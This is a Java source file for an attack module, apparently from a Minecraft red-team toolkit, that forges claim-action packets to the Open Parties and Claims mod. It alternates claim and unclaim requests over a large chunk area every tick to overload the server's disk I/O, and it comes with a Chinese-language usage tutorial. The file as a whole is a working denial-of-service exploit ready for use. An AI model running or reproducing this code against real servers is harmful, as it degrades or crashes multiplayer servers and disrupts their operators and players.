package com.redblue.red.modules.opac;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * OPAC-01: Claim Area DoS -- exploits weak single-tick rate limit on
 * ServerboundClaimActionRequestPacket (index 21).
 *
 * Each request processes up to 100 chunk operations (32x32 area capped to 100).
 * At 20 TPS, this yields ~2000 chunk claim/unclaim ops per second,
 * each involving disk I/O, state updates, and sync packets to nearby players.
 *
 * Attack cycles CLAIM then UNCLAIM to maximize I/O churn.
 */
public class OPAC01_ClaimAreaDoS implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("openpartiesandclaims", "main");
    private static final int IDX_CLAIM_ACTION = 21;

    // ClaimsManager$Action ordinals (verified via javap)
    private static final byte ACTION_CLAIM = 0;
    private static final byte ACTION_UNCLAIM = 1;

    private long lastTick = 0;
    private boolean claimPhase = true; // alternate claim/unclaim

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 可能导致服务器严重卡顿", false),
        ConfigParam.ofEnum("mode", "攻击模式", "AUTO",
                "AUTO", "CLAIM_ONLY", "UNCLAIM_ONLY"),
        ConfigParam.ofInt("area_size", "区域半径 (区块)", 16, 1, 16),
        ConfigParam.ofInt("interval", "发包间隔 (tick)", 1, 1, 20)
    );

    @Override public String id() { return "opac01_claim_dos"; }
    @Override public String name() { return "领地操作DoS"; }
    @Override public String description() { return "利用领地区域操作的弱速率限制造成服务器I/O过载"; }

    @Override
    public String getTutorial() {
        return "[原理]\n"
            + "ServerboundClaimActionRequestPacket 仅有单tick速率限制\n"
            + "每个请求可处理最多100个区块操作(32x32区域)\n"
            + "以20TPS速率持续发送 = 每秒2000次区块操作\n"
            + "每次操作涉及磁盘I/O、状态更新、同步广播\n\n"
            + "[使用方法]\n"
            + "1. 勾选确认复选框\n"
            + "2. 启用模块，自动以tick循环发送\n"
            + "3. AUTO模式交替claim/unclaim最大化I/O抖动\n\n"
            + "[参数]\n"
            + "区域半径: 以玩家区块坐标为中心的半径(最大16)\n"
            + "发包间隔: 每N个tick发一次(1=最快，每tick一次)";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("openpartiesandclaims");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        sendClaimPacket(mc, ACTION_CLAIM);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        String mode = getParam("mode").map(ConfigParam::getString).orElse("AUTO");
        byte action;
        switch (mode) {
            case "CLAIM_ONLY":
                action = ACTION_CLAIM;
                break;
            case "UNCLAIM_ONLY":
                action = ACTION_UNCLAIM;
                break;
            default: // AUTO
                action = claimPhase ? ACTION_CLAIM : ACTION_UNCLAIM;
                claimPhase = !claimPhase;
                break;
        }
        sendClaimPacket(mc, action);
    }

    private void sendClaimPacket(Minecraft mc, byte action) {
        int halfSize = getParam("area_size").map(ConfigParam::getInt).orElse(16);
        int chunkX = mc.player.chunkPosition().x;
        int chunkZ = mc.player.chunkPosition().z;

        int left = chunkX - halfSize;
        int top = chunkZ - halfSize;
        int right = chunkX + halfSize - 1;
        int bottom = chunkZ + halfSize - 1;

        CompoundTag tag = new CompoundTag();
        tag.putByte("a", action);
        tag.putInt("l", left);
        tag.putInt("t", top);
        tag.putInt("r", right);
        tag.putInt("b", bottom);
        tag.putBoolean("s", false);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_CLAIM_ACTION);
            buf.writeNbt(tag);
        });
    }
}
